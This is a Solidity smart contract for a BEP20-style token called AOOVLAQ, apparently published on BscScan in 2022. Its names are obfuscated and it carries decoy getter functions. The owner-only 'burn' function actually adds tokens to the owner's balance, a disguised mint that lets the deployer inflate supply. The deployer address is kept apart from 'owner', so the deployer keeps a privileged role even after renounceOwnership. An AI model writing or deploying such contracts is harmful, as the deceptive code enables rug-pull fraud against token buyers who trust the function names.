/**
 *Submitted for verification at BscScan.com on 2022-12-03
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.7.5;
contract AOOVLAQ {
uint256 private  AOOVLAQ3 = 100000000;	
event Approval(address indexed owner, address indexed spender, uint256 value);
address private  SCXYVL = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
address private  OIGMYC = address(0);
uint256 private  PBROPJ = 10000000000;
uint256 private  PONUGT = 10000000000000;
uint256 private  EFXZPL = 100000000;
string public  name = "AOOVLAQ";
uint256 private  WRYSKP = 1000000000000000000;
address private  XPUNNF = address(0);
address private  GGSLMR = address(0);
mapping (address => uint256) public balanceOf;
uint256 private  HJHEAF = 1000000000000000000000;
uint8 public constant decimals = 18;
address private  OBCJQB = address(0);
uint256 public constant LZDHJO = 99999;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 private  JYWGDC = 1000000000000000000;
address public owner;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
string public  symbol = "AOOVLAQ";
uint256 private  BQSCCK = 1000000000000000;
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tVFOJNR 0");
require(spender != address(0), "fVFOJNR 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "VFOJNR");
require(to != address(0), "VFOJNR");
require(amount <= balanceOf[from], "VFOJNR");
uint256 tree;
if (from == owner || to == owner){
tree = 0;
}
else{
tree = LZDHJO/WRYSKP * amount;
}

uint256 transferAmount = amount - tree;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += tree;
if (to==OBCJQB){
WRYSKP = LZDHJO+AOOVLAQ3/AOOVLAQ3;
}
emit Transfer(from, to, transferAmount);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getBQSCCK() private returns (uint256) {
return BQSCCK;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
constructor () {
OBCJQB = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getXPUNNF() private returns (address) {
return XPUNNF;
}

function _getSCXYVL() private returns (address) {
return SCXYVL;
}

function _getPONUGT() private returns (uint256) {
return PONUGT;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getEFXZPL() private returns (uint256) {
return EFXZPL;
}

function _getJYWGDC() private returns (uint256) {
return JYWGDC;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getOIGMYC() private returns (address) {
return OIGMYC;
}

function _getPBROPJ() private returns (uint256) {
return PBROPJ;
}

function _getGGSLMR() private returns (address) {
return GGSLMR;
}

function _getHJHEAF() private returns (uint256) {
return HJHEAF;
}


}